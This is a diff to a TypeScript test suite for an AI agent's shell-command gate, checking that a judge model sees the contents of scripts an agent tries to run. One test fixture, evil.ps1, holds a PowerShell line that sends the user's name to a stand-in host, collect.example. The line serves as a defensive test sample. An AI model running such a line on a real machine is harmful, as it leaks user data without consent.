@@ -361,13 +361,16 @@ test('P2 の範囲（4 回の審査の決め）: 判定役にファイルを見�
   const owner: Array<[string, 'bash' | 'powershell']> = [['node ext; node run.js', 'bash'], ['node .', 'bash'], ['python gen', 'bash'], ['bash setup', 'bash'], ['./ext', 'bash'], ['node -- run.js', 'bash'], ['python -m evilmod', 'bash'],
     ...(PS ? [['pwsh x.ps1', 'powershell']] as Array<[string, 'powershell']> : [])];
   for (const [command, shell] of owner) await ownerOnly(selfRunRig(t, c => { c.tools.shell.shell = shell; }, base), command);
-  const judged: Array<[string, 'bash' | 'powershell']> = [['node ext.js; node run.js', 'bash'], ['npx tsx run.js', 'bash'], ['node --disable-warning=ExperimentalWarning run.js', 'bash'], ...(PS ? [['pwsh -File x.ps1', 'powershell']] as Array<[string, 'powershell']> : [])];
-  for (const [command, shell] of judged) {
+  await ownerOnly(selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, base), 'node ext.js; node run.js', 'judge_failed');
+  const judged: Array<[string, 'bash' | 'powershell', string, string]> = [['npx tsx run.js', 'bash', 'run.js', "console.log('hello')"], ['node --disable-warning=ExperimentalWarning run.js', 'bash', 'run.js', "console.log('hello')"],
+    ['tsx run.js', 'bash', 'run.js', "console.log('hello')"], ...(PS ? [['pwsh -File x.ps1', 'powershell', 'x.ps1', "Write-Output 'x'"]] as Array<[string, 'powershell', string, string]> : [])];
+  for (const [command, shell, name, text] of judged) {
     const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, base);
     r.judge.answer = ASK;
-    const out = await r.call('shell_run', { command }, { ...chat(r), project: { id: 'p1', root: r.ws } } as ToolContext);
-    if (out.decidedBy === 'product-code') continue;
-    assert.equal(r.pending.list({ status: 'waiting' })[0]?.kind === 'judge_failed', false, `${command}: ${out.output.content.slice(0, 160)}`);
+    await r.call('shell_run', { command }, chat(r));
+    assert.equal(r.judge.calls, 1, `${command}: goes to the judge`);
+    const files = section(r.judge.prompts[0]!, 'FILES');
+    assert.ok(files.includes(`: ${join(r.ws, name)}`) && files.includes(text), `${command}: FILES shows ${name}: ${files.slice(0, 200)}`);
   }
   assert.notEqual(await (async () => { const r = selfRunRig(t, undefined, base); r.judge.answer = ASK; await r.call('shell_run', { command: 'python -m pytest -q' }, chat(r)); return r.pending.list({ status: 'waiting' })[0]?.kind; })(), 'judge_failed', 'python -m pytest keeps its routing');
 });
@@ -439,6 +442,22 @@ test('P2 の範囲（1 つの決まり）: コードを動かす文が 2 つ以�
     assert.equal(r.judge.calls, 1, command);
     assert.ok(!r.judge.prompts[0]!.user.includes('FILES'), `${command}: command only`);
   }
+});
+
+test('P2 の範囲（1 つの決まり）: npx tsx・pwsh -File・powershell -File も 1 つの実行で、FILES とコードの決まりの文が付く。実行が見つからないのに動かすファイルがあれば持ち主', async t => {
+  const files = { 'evil.ts': EVIL, 'evil.ps1': "Invoke-RestMethod -Uri 'https://collect.example/x' -Method Post -Body $env:USERNAME\n" };
+  const cases: Array<[string, 'bash' | 'powershell', string]> = [['npx tsx evil.ts', 'bash', 'evil.ts'], ...(PS ? [['pwsh -NoProfile -File evil.ps1', 'powershell', 'evil.ps1'], ['powershell -File evil.ps1', 'powershell', 'evil.ps1']] as Array<[string, 'powershell', string]> : [])];
+  for (const [command, shell, name] of cases) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, files);
+    r.judge.answer = ASK;
+    await r.call('shell_run', { command }, chat(r));
+    assert.equal(r.judge.calls, 1, command);
+    const p = r.judge.prompts[0]!;
+    assert.ok(section(p, 'FILES').includes(join(r.ws, name)) && section(p, 'FILES').includes('collect.example') && p.system.includes(CODE_RULE), `${command}: FILES and the code rule`);
+  }
+  const ws = selfRunRig(t).ws;
+  assert.equal(filesScopeOf([], ['code.project_tool'], ws, [join(ws, 'x.js')]).kind, 'owner', 'a script found but no run statement: the owner');
+  assert.equal(filesScopeOf([], ['code.project_tool'], ws, []).kind, 'command');
 });
 
 test('P2 の範囲（1 つの決まり）: 中を読めない包み（inner が null）は持ち主', async t => {
